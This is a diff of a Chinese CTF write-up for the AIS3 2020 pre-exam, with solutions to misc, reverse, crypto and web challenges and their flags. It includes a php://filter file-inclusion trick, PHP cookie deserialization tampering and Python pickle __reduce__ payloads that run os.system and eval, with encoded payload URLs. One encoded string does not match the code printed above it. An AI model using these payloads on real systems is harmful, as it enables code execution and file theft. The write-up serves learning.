@@ -2,51 +2,69 @@
 
 For English version, see [README](README.md)
 
-人生中第一場CTF，解了10題，看了很多前輩寫的Write Up，讓我獲益良多，解了不少題目，所以比賽還沒結束我就想好要寫這份Write Up了，希望可以幫助新來的菜鳥。也感謝所有的出題TA，~~讓我撿了不少水題~~。
+## 目錄
 
-[TOC]
+<!-- MarkdownTOC -->
 
-以下整理這次的題目，有連結的就是有解題思路，有Flag的，就是我有~~賽到~~解出來的題目
+- [題目列表](#%E9%A1%8C%E7%9B%AE%E5%88%97%E8%A1%A8)
+- [🐧 Misc](#%F0%9F%90%A7-misc)
+    - [💤 Piquero](#%F0%9F%92%A4-piquero)
+    - [🐥 Karuego](#%F0%9F%90%A5-karuego)
+    - [🌱 Soy](#%F0%9F%8C%B1-soy)
+    - [👑 Saburo](#%F0%9F%91%91-saburo)
+- [♻️ Reverse](#%E2%99%BB%EF%B8%8F-reverse)
+    - [🎹 Fallen Beat](#%F0%9F%8E%B9-fallen-beat)
+- [🙊 Crypto](#%F0%9F%99%8A-crypto)
+    - [🦕 Brontosaurus](#%F0%9F%A6%95-brontosaurus)
+    - [🦖 T-Rex](#%F0%9F%A6%96-t-rex)
+- [🌐 Web](#%F0%9F%8C%90-web)
+    - [🦈 Shark](#%F0%9F%A6%88-shark)
+    - [🐘 Elephant](#%F0%9F%90%98-elephant)
+    - [🐍 Snake](#%F0%9F%90%8D-snake)
+- [心得](#%E5%BF%83%E5%BE%97)
+
+<!-- /MarkdownTOC -->
+
 ## 題目列表
 
-| 分類      | 題目                   | 最後分數 | 解題成功 | Flag                                                         |
-| --------- | ---------------------- | -------- | -------- | ------------------------------------------------------------ |
-| 🐧 Misc    | 💤 Piquero              | 100      | 347      | `AIS3{I_feel_sleepy_Good_Night!!!}`                          |
-| 🐧 Misc    | 🐥 Karuego              | 100      | 245      | `AIS3{Ar3_y0u_r34l1y_r34dy_t0_sumnn0n_4_D3m0n?}`             |
-| 🐧 Misc    | 🌱 Soy                  | 139      | 172      | `AIS3{H0w_c4n_y0u_f1nd_me?!?!?!!}`                           |
-| 🐧 Misc    | 👑 Saburo               | 359      | 108      | `AIS3{A1r1ght_U_4r3_my_3n3nnies}`                            |
-| 🐧 Misc    | 👿 Shichirou            | 450      | 65       |                                                              |
-| 🐧 Misc    | 🧸 Clara                | 500      | 2        |                                                              |
-| ♻️ Reverse | 🍍 TsaiBro              | 100      | 281      |                                                              |
-| ♻️ Reverse | 🎹 Fallen Beat          | 144      | 171      | `AIS3{Wow_how_m4ny_h4nds_do_you_h4ve}`                       |
-| ♻️ Reverse | 🧠 Stand up!Brain       | 455      | 62       |                                                              |
-| ♻️ Reverse | 🍹 Long Island Iced Tea | 498      | 15       |                                                              |
-| ♻️ Reverse | 🌹 La vie en rose       | 499      | 12       |                                                              |
-| ♻️ Reverse | 🐉 Uroboros             | 500      | 9        |                                                              |
-| 💥 Pwn     | 👻 BOF                  | 100      | 189      |                                                              |
-| 💥 Pwn     | 📃 Nonsense             | 474      | 47       |                                                              |
-| 💥 Pwn     | 🔫 Portal gun           | 491      | 28       |                                                              |
-| 💥 Pwn     | 🏫 Morty school         | 498      | 14       |                                                              |
-| 💥 Pwn     | 🔮 Death crystal        | 499      | 10       |                                                              |
-| 💥 Pwn     | 📦 Meeseeks box         | 500      | 8        |                                                              |
-| 🙊 Crypto  | 🦕 Brontosaurus         | 100      | 380      | `AIS3{Br0n7Os4uru5_ch3at_3asi1Y}`                            |
-| 🙊 Crypto  | 🦖 T-Rex                | 100      | 381      | `AIS3{TYR4NN0S4URU5_R3X_GIV3_Y0U_SOMETHING_RANDOM_5TD6XQIVN3H7EUF8ODET4T3H907HUC69L6LTSH4KN3EURN49BIOUY6HBFCVJRZP0O83FWM0Z59IISJ5A2VFQG1QJ0LECYLA0A1UYIHTIIT1IWH0JX4T3ZJ1KSBRM9GED63CJVBQHQORVEJZELUJW5UG78B9PP1SIRM1IF500H52USDPIVRK7VGZULBO3RRE1OLNGNALX}` |
-| 🙊 Crypto  | 🐙 Octopus              | 372      | 103      |                                                              |
-| 🙊 Crypto  | 🐡 Blowfish             | 480      | 42       |                                                              |
-| 🙊 Crypto  | 🐪 Camel                | 497      | 18       |                                                              |
-| 🙊 Crypto  | 🐢 Turtle               | 498      | 14       |                                                              |
-| 🌐 Web     | 🐿️ Squirrel             | 100      | 220      |                                                              |
-| 🌐 Web     | 🦈 Shark                | 100      | 261      | `AIS3{5h4rk5_d0n'7_5w1m_b4ckw4rd5}`                          |
-| 🌐 Web     | 🐘 Elephant             | 168      | 165      | `AIS3{0nly_3l3ph4n75_5h0uld_0wn_1v0ry}`                      |
-| 🌐 Web     | 🐍 Snake                | 272      | 137      | `AIS3{7h3_5n4k3_w1ll_4lw4y5_b173_b4ck.}`                     |
-| 🌐 Web     | 🦉 Owl                  | 492      | 27       |                                                              |
-| 🌐 Web     | 🦏 Rhino                | 494      | 24       |                                                              |
+| 分類      | 題目                   | 最後分數 | 解題人數 | 解題成功 |
+| --------- | ---------------------- | -------- | -------- | -------- |
+| 🐧 Misc    | 💤 Piquero              | 100      | 347      | ✅        |
+| 🐧 Misc    | 🐥 Karuego              | 100      | 245      | ✅        |
+| 🐧 Misc    | 🌱 Soy                  | 139      | 172      | ✅        |
+| 🐧 Misc    | 👑 Saburo               | 359      | 108      | ✅        |
+| 🐧 Misc    | 👿 Shichirou            | 450      | 65       |          |
+| 🐧 Misc    | 🧸 Clara                | 500      | 2        |          |
+| ♻️ Reverse | 🍍 TsaiBro              | 100      | 281      |          |
+| ♻️ Reverse | 🎹 Fallen Beat          | 144      | 171      | ✅        |
+| ♻️ Reverse | 🧠 Stand up!Brain       | 455      | 62       |          |
+| ♻️ Reverse | 🍹 Long Island Iced Tea | 498      | 15       |          |
+| ♻️ Reverse | 🌹 La vie en rose       | 499      | 12       |          |
+| ♻️ Reverse | 🐉 Uroboros             | 500      | 9        |          |
+| 💥 Pwn     | 👻 BOF                  | 100      | 189      |          |
+| 💥 Pwn     | 📃 Nonsense             | 474      | 47       |          |
+| 💥 Pwn     | 🔫 Portal gun           | 491      | 28       |          |
+| 💥 Pwn     | 🏫 Morty school         | 498      | 14       |          |
+| 💥 Pwn     | 🔮 Death crystal        | 499      | 10       |          |
+| 💥 Pwn     | 📦 Meeseeks box         | 500      | 8        |          |
+| 🙊 Crypto  | 🦕 Brontosaurus         | 100      | 380      | ✅        |
+| 🙊 Crypto  | 🦖 T-Rex                | 100      | 381      | ✅        |
+| 🙊 Crypto  | 🐙 Octopus              | 372      | 103      |          |
+| 🙊 Crypto  | 🐡 Blowfish             | 480      | 42       |          |
+| 🙊 Crypto  | 🐪 Camel                | 497      | 18       |          |
+| 🙊 Crypto  | 🐢 Turtle               | 498      | 14       |          |
+| 🌐 Web     | 🐿️ Squirrel             | 100      | 220      |          |
+| 🌐 Web     | 🦈 Shark                | 100      | 261      | ✅        |
+| 🌐 Web     | 🐘 Elephant             | 168      | 165      | ✅        |
+| 🌐 Web     | 🐍 Snake                | 272      | 137      | ✅        |
+| 🌐 Web     | 🦉 Owl                  | 492      | 27       |          |
+| 🌐 Web     | 🦏 Rhino                | 494      | 24       |          |
 
 ## 🐧 Misc
 
 ### 💤 Piquero
 
-![Piquero](💤%20Piquero/Piquero_99c9aa83fe492df8d52229017d4dca92297c9aeb.jpg)
+![Piquero](Problems/🐧%20Misc/💤%20Piquero/Piquero_99c9aa83fe492df8d52229017d4dca92297c9aeb.jpg)
 
 如果你搭電梯真的很無聊，你對這題一定特別有想法 (X
 
@@ -66,7 +84,7 @@ Flag：`AIS3{I_feel_sleepy_Good_Night!!!}`
 
 ### 🐥 Karuego
 
-![Karuego](🐥%20Karuego/Karuego_0d9f4a9262326e0150272debfd4418aaa600ffe4.png)
+![Karuego](Problems/🐧%20Misc/🐥%20Karuego/Karuego_0d9f4a9262326e0150272debfd4418aaa600ffe4.png)
 
 這個是一張png的圖片，flag就藏在這個裡面
 
@@ -119,13 +137,15 @@ Flag：`AIS3{Ar3_y0u_r34l1y_r34dy_t0_sumnn0n_4_D3m0n?}`
 
 ### 🌱 Soy
 
-![Soy](🌱%20Soy/Soy_b692c44dd2a32b30eee8a9315091d79f7dd8c8a8.png)
+![Soy](Problems/🐧%20Misc/🌱%20Soy/Soy_b692c44dd2a32b30eee8a9315091d79f7dd8c8a8.png)
 
-修復QR Code，對QR Code有一些基礎的了解是很有幫助的
+就是修復QR Code，沒毛病
+
+但是如果對QR Code有一些基礎的了解，是很有幫助的
 
 比方說下面這張空的QR Code
 
-![Blank](🌱%20Soy/Blank%20QR.png)
+![Blank](Miscs/soy_blank.png)
 
 紅色的是固定的定位標記，藍色的是[Format Info](https://zh.wikipedia.org/wiki/QR%E7%A2%BC#%E7%BB%93%E6%9E%84)
 
@@ -135,13 +155,13 @@ Flag：`AIS3{Ar3_y0u_r34l1y_r34dy_t0_sumnn0n_4_D3m0n?}`
 
 接下來把題目剩下的格子一個一個填進去，解到一定的程度之後就可以掃的出來了
 
-![Decrypted](🌱%20Soy/Decrypted.png)
+![Decrypted](Miscs/soy_decrypted.png)
 
 Flag：`AIS3{H0w_c4n_y0u_f1nd_me?!?!?!!}`
 
 ### 👑 Saburo
 
-![Problem](👑%20Saburo/Problem.png)
+![Problem](Problems/🐧%20Misc/👑%20Saburo/Problem.png)
 
 這題一開始我本來也是沒什麼想法
 
@@ -179,7 +199,7 @@ print(s.recv(1024).strip().decode())
 
 於是絕望之際，我有一個大膽的想法
 
-![Keyboard Maestro](👑%20Saburo/Keyboard%20Maestro.png)
+![Keyboard Maestro](Miscs/saburo_keyboard_maestro.png)
 
 如果沒用過的，這個叫按鍵精靈
 
@@ -189,7 +209,7 @@ print(s.recv(1024).strip().decode())
 
 啊執行起來就會像下面這樣
 
-[![terminal_demo](👑%20Saburo/terminal_demo.gif)](https://asciinema.org/a/339381)
+[![terminal_demo](Miscs/saburo_demo.gif)](https://asciinema.org/a/339381)
 
 這一次Iteration的答案是`i`哦，你猜對了嗎：）
 
@@ -201,9 +221,15 @@ print(s.recv(1024).strip().decode())
 
 幾乎要測到10次以上取平均才比較有機會觀察到差異
 
-或是呢 發揮一點你的小創意
+或是就 發揮你的想像力
 
-You are my Enem... ENEMIES
+![imagination](Miscs/saburo_imagination.gif)
+
+You are my Ene.... energy?
+
+好吧想像力薄弱的話就只能多試幾次ㄌ唄
+
+最後快解出來的秒數大概會接近 400ms
 
 Flag：`AIS3{A1r1ght_U_4r3_my_3n3nnies}`
 
@@ -211,7 +237,7 @@ Flag：`AIS3{A1r1ght_U_4r3_my_3n3nnies}`
 
 ### 🎹 Fallen Beat
 
-![Problem](🎹%20Fallen%20Beat/Problem.png)
+![Problem](Problems/♻️%20Reverse/🎹%20Fallen%20Beat/Problem.png)
 
 這題其實是我解出來的第一題，
 
@@ -225,7 +251,7 @@ Flag：`AIS3{A1r1ght_U_4r3_my_3n3nnies}`
 
 只要打出Full Combo就可以得到flag了是吧
 
-![Full Combo](🎹%20Fallen%20Beat/Full%20Combo.png)
+![Full Combo](Miscs/fallen_beat_full_combo.png)
 
 呵呵，呵呵呵
 
@@ -288,7 +314,7 @@ while (br.ready()) {
 
 於是我們終於找到`fumenPath`是的值是`songs/gekkou/hell.txt`
 
-重新把code打包成`Exploit.java`
+重新把code打包成[`Exploit.java`](Solving%20Source%20Code/🎹%20Fallen%20Beat/Exploit.java)
 
 然後把原本解壓縮目錄裡的`songs/gekkou/hell.txt`移到這個java檔的同一個目錄底下執行就可以得到flag了
 
@@ -306,7 +332,7 @@ Flag：`AIS3{Wow_how_m4ny_h4nds_do_you_h4ve}`
 
 ### 🦕 Brontosaurus
 
-![Problem](🦕%20Brontosaurus/Problem.png)
+![Problem](Problems/🙊%20Crypto/🦕%20Brontosaurus/Problem.png)
 
 從題目的說明可以看到
 
@@ -324,7 +350,7 @@ Flag：`AIS3{Br0n7Os4uru5_ch3at_3asi1Y}`
 
 ### 🦖 T-Rex
 
-![Problem](🦖%20T-Rex/Problem.png)
+![Problem](Problems/🙊%20Crypto/🦖%20T-Rex/Problem.png)
 
 這題的關鍵字在`nihilist`，
 
@@ -340,7 +366,7 @@ nihilist cipher由兩個關鍵部件組成，一個是加密盤，一個是密�
 
 雖然網路上好像有不少現成的工具，但我找不太到適合的
 
-所以自己用Python寫了一個，有興趣的可以看看[`T-Rex.py`](🦖%20T-Rex/T-Rex.py)
+所以自己用Python寫了一個，有興趣的可以看看[`T-Rex.py`](Solving%20Source%20Code/🦖%20T-Rex/T-Rex.py)
 
 Flag：`AIS3{TYR4NN0S4URU5_R3X_GIV3_Y0U_SOMETHING_RANDOM_5TD6XQIVN3H7EUF8ODET4T3H907HUC69L6LTSH4KN3EURN49BIOUY6HBFCVJRZP0O83FWM0Z59IISJ5A2VFQG1QJ0LECYLA0A1UYIHTIIT1IWH0JX4T3ZJ1KSBRM9GED63CJVBQHQORVEJZELUJW5UG78B9PP1SIRM1IF500H52USDPIVRK7VGZULBO3RRE1OLNGNALX}`
 
@@ -348,7 +374,7 @@ Flag：`AIS3{TYR4NN0S4URU5_R3X_GIV3_Y0U_SOMETHING_RANDOM_5TD6XQIVN3H7EUF8ODET4T3
 
 ### 🦈 Shark
 
-![problem](./🦈%20Shark/Problem.png)
+![problem](Problems/🌐%20Web/🦈%20Shark/Problem.png)
 
 從題目的描述，我猜這題應該是某一年考古題的進化版
 
@@ -356,11 +382,11 @@ Flag：`AIS3{TYR4NN0S4URU5_R3X_GIV3_Y0U_SOMETHING_RANDOM_5TD6XQIVN3H7EUF8ODET4T3
 
 首先來看主頁
 
-![home](🦈%20Shark/home.png)
+![home](Miscs/shark_home.png)
 
 原始碼也沒什麼特別的，點進連結看看
 
-![hint.txt](🦈%20Shark/hint.txt.png)
+![hint.txt](Miscs/shark_hint_txt.png)
 
 提示說flag並不在執行server的這台主機上，而是在同一個區域網路下的另一台web伺服器伺服器上
 
@@ -378,7 +404,7 @@ https://shark.ais3.org/?path=/proc/net/fib_trie
 
 https://shark.ais3.org/?path=index.php
 
-![index.php](🦈%20Shark/index.php.png)
+![index.php](Miscs/shark_index_php.png)
 
 這裡可以發現這一段php會用regular expression阻擋絕對路徑和使用`..`作為路徑開頭的檔案
 
@@ -402,7 +428,7 @@ https://shark.ais3.org/?path=/proc/net/fib_trie
 
 https://shark.ais3.org/?path=php://filter/resource=/proc/net/fib_trie
 
-![/proc/net/fib_trie](🦈%20Shark/:proc:net:fib_trie.png)
+![/proc/net/fib_trie](Miscs/shark_proc_net_fib_trie.png)
 
 嗒噠！！
 
@@ -434,23 +460,23 @@ Flag：`AIS3{5h4rk5_d0n'7_5w1m_b4ckw4rd5}`
 
 ### 🐘 Elephant
 
-![Problem](🐘%20Elephant/Problem.png)
+![Problem](Problems/🌐%20Web/🐘%20Elephant/Problem.png)
 
 先看看連結
 
-![home](🐘%20Elephant/home.png)
+![home](Miscs/elephant_home.png)
 
 不知道這是什麼
 
 隨便打個名字submit看看
 
-![login](🐘%20Elephant/login.png)
+![login](Miscs/elephant_login.png)
 
 岔題一下，題目有提到網頁中有提示，可是discord上很多人都找不到
 
 這我就不懂了，就算你連開發者工具都不會用，在網頁上亂拉亂點或全選總不是什麼困難的事吧 (?
 
-![hint](🐘%20Elephant/hint.png)
+![hint](Miscs/elephant_hint.png)
 
 其實老實說我到結束都沒有找到看source code的方法，
 
@@ -466,7 +492,7 @@ OK扯遠了，回頭看看網頁的文字
 
 那登入完之後通常會帶上cookie，那就來檢查一下
 
-![cookie](🐘%20Elephant/cookie.png)
+![cookie](Miscs/elephant_cookie.png)
 
 php的cookie通常是base64 encode，先解回來
 
@@ -486,6 +512,280 @@ O:4:"User":2:{s:4:"name";s:4:"Tomy";s:11:"?User?token";b:1;}
 
 用base64 encode回去，再填回瀏覽器裡
 
-![flag](🐘%20Elephant/flag.png)
+![flag](Miscs/elephant_flag.png)
 
 Flag：`AIS3{0nly_3l3ph4n75_5h0uld_0wn_1v0ry}`
+
+### 🐍 Snake
+
+![Problem](Problems/🌐%20Web/🐍%20Snake/Problem.png)
+
+這題其實是真·賽到
+
+根據我事後跟出題者[@djosix](https://github.com/djosix)的討論
+
+我的解法方向上是對的
+
+但是理論上100%的解題進度
+
+我在解到大概50%的時候Flag就噴出來了
+
+但是
+
+I'm certainly not the first,
+
+and definitely not the last.
+
+會發生這個現象並不是因為我的解法而產生的特殊解
+
+而是跑flask gunicorn的全域變數被改掉了
+
+所以某一些request就被cache起來之類的
+
+~~這就是為什麼final countdown前這題突然多了好多解題成功的紀錄~~
+
+但總之我還是記錄一下我的解題思路
+
+```python
+from flask import Flask, Response, request
+import pickle, base64, traceback
+
+Response.default_mimetype = 'text/plain'
+
+app = Flask(__name__)
+
+@app.route("/")
+def index():
+    data = request.values.get('data')
+    
+    if data is not None:
+        try:
+            data = base64.b64decode(data)
+            data = pickle.loads(data)
+            
+            if data and not data:
+                return open('/flag').read()
+
+            return str(data)
+        except:
+            return traceback.format_exc()
+        
+    return open(__file__).read()
+```
+
+進來首先就先看到 flask 的 source code
+
+在第10~15行的地方可以看到送一個data字串的參數進去
+
+會先被 base64 decode，然後以字串的型態 pickle load 為 Python 的物件
+
+然後如果滿足`data and not data`的話
+
+就可以成功讀出flag
+
+當時我看到這題的第一個想法是
+
+如果我可以寫一個自定義的class
+
+然後 overload and, not, bool 之類的 operator 就可以滿足這個if條件式了
+
+於是我讀了一下 Python [Truth Value Testing](https://docs.python.org/3.8/library/stdtypes.html#truth) 和 [operator](https://docs.python.org/3.8/library/operator.html#module-operator) 的文檔
+
+然後發現 and 跟 not 是不能被 overload 的
+
+所以我現在唯一的辦法就是 overload bool operator
+
+讓他在奇數次呼叫的時候回傳 True
+
+偶數次呼叫回傳 False
+
+Class 大概長這樣
+
+```python
+class Exploit(object):
+    def __init__(self, initial=True):
+        self.initial = initial
+    def __bool__(self):
+        self.initial = not self.initial
+        return not self.initial
+```
+
+測試一下
+
+```python
+e = Exploit()
+print(e and not e) # True
+```
+
+漂亮
+
+接下來只要把它封裝起來就可以了
+
+```python
+import pickle
+import base64
+print(base64.b64encode(pickle.dumps(e)).decode())
+# gANjX19tYWluX18KRXhwbG9pdApxACmBcQF9cQJYBwAAAGluaXRpYWxxA4hzYi4=
+```
+
+打包成網址
+
+https://snake.ais3.org/?data=gANjX19tYWluX18KRXhwbG9pdApxACmBcQF9cQJYBwAAAGluaXRpYWxxA4hzYi4=
+
+```
+Traceback (most recent call last):
+  File "./main.py", line 15, in index
+    data = pickle.loads(data)
+AttributeError: Can't get attribute 'Exploit' on <module '__main__' (built-in)>
+```
+
+
+
+經過一陣子的研究，問題在於一個很重要的概念，[文檔](https://docs.python.org/3/library/pickle.html#comparison-with-marshal)裡有提到
+
+> pickle can save and restore class instances transparently, however the **class definition must be importable** and live in the same module as when the object was stored.
+
+也就是說，除非執行 Flask 的環境有一個特別定義好可以讓我們 load 的 class (別鬧了)
+
+不然唯一的可能就是上傳一個Python原生環境就有的物件
+
+於是我又翻了一下 Elephant 那題用到的[w181496 / Web-CTF-Cheatsheet](https://github.com/w181496/Web-CTF-Cheatsheet#python-pickle)
+
+裡面有提到 pickle 有一個神奇的用法
+
+對於某些不應該被直接serialize和dump成string的物件/屬性，比方說file descriptor
+
+可以把還原這些東西的方式定義在 \__reduce__ 這個 method 來讓 pickle load 的時候呼叫
+
+[文檔](https://docs.python.org/3.8/library/pickle.html#object.__reduce__)裡有更多詳細的說明和用法，細節不贅述
+
+簡單的來說，以下面這個 Class 做範例
+
+```python
+class Exploit(object):
+    def __reduce__(self):
+        return os.system, ("id",)
+```
+
+pickle load 的時候，會呼叫
+
+```python
+os.system("id")
+```
+
+但是因為這個 function 在 Python 中本來就只會回傳指令執行返回的狀態
+
+而不會 pipe stdout 到變數裡
+
+所以應該找類似的function來試試
+
+中間我試了很多其他的
+
+可是跑出來的結果幾乎都跟我想像的不一樣
+
+我開始懷疑預期解是不是另有他方，伺服器把這條路給擋掉了
+
+為了測試伺服器的確有確實呼叫我後面參數的shell指令
+
+於是我把上面的範例修改了一下下
+
+```python
+class Exploit(object):
+    def __reduce__(self):
+        return os.system, ("sleep 5",)
+```
+
+如果這個request轉了超過5秒才回傳
+
+就代表指令有被確實被執行
+
+於是我開心的輸入網址
+
+https://snake.ais3.org/?data=gANjcG9zaXgKc3lzdGVtCnEAWAcAAABzbGVlcCA1cQGFcQJScQMu
+
+```
+AIS3{7h3_5n4k3_w1ll_4lw4y5_b173_b4ck.}
+```
+
+Excuse Me???
+
+我知道大難當前我缺分數
+
+但...
+
+![It Doesn't Work Why It Works Why](Miscs/snake_work.png)
+
+啊 反正flag有了，
+
+等比賽正式結束我再來慢慢研究
+
+於是乎，即便等到比賽結束了我還是想不透
+
+直到隔天下午
+
+![discord](Miscs/snake_discord.png)
+
+於是後來我私訊了作者之後
+
+才得出了上面開頭的結論
+
+那就直接跳結論
+
+```python
+class Exploit(object):
+    def __reduce__(self):
+        return (eval, ("open('/flag').read()",))
+
+e = Exploit()
+print(base64.b64encode(pickle.dumps(e)).decode())
+# gANjcG9zaXgKc3lzdGVtCnEAWAIAAABpZHEBhXECUnEDLg==
+```
+
+其實正規解法跟我的進度其實就只差最後一個重點：
+
+*evil 的 eval*
+
+作者的[官方解](https://github.com/djosix/AIS3-2020-Pre-Exam#snake-web)那邊還有很多解法
+
+伺服器被玩壞可能的原因等等腦洞大開的細節
+
+有興趣就自行移駕囉
+
+## 心得
+
+![Scoreboard](Miscs/scoreboard.png)
+
+人生中第一場CTF，解了10題，看了很多前輩寫的Write Up，讓我獲益良多，解了不少題目，所以比賽還沒結束我就想好要寫這份Write Up和心得了。
+
+作為一個新手寫的的Write Up，立場應該會稍微接近正常人的思維，沒有祖傳秘方或通靈大法，解題過程都還算有上下文，希望能幫助到有興趣的人。
+
+也感謝所有的出題TA：
+
+* ~~出了很多水題讓我撿~~
+* 24小時全力放送洗腦音樂、宣傳各種邪教（X
+* 最後一天伺服器爆了加賽2小時，讓我親眼見證Saburo是解的出來的
+
+順便附上一點小心得：
+
+* 搜尋關鍵字 + CTF 可以平均一題可以節省30分鐘至3小時左右
+* 解題不用通靈，但是快速分辨水題可能要 (?)，先寫會的這種事相信大啊國小老師都有教 吧(?)
+
+* 不要屯flag、不要屯flag、不要屯flag
+
+  * 節錄自Discord的Final Countdown播到最後一次副歌的聊天室
+
+  ![Final Countdown](Miscs/final_countdown.png)
+
+* ~~AIS3重點不是解題，進Discord聊天群刷GIF和emoji才是本體~~
+
+好了，這份Write Up經歷期末專題加期末考轟炸，
+
+打了這麼久，終於收工了，感謝各位客官的收看
+
+![Rainbow Capoo Shake](Miscs/rainbow_capoo_shake.gif)
+
+![Flag Length](Miscs/flag_length.png)
+
+![CTF Player](Miscs/ctf_player.jpg)
+
+![I'm just sucked](Miscs/Im_just_sucked.jpg)
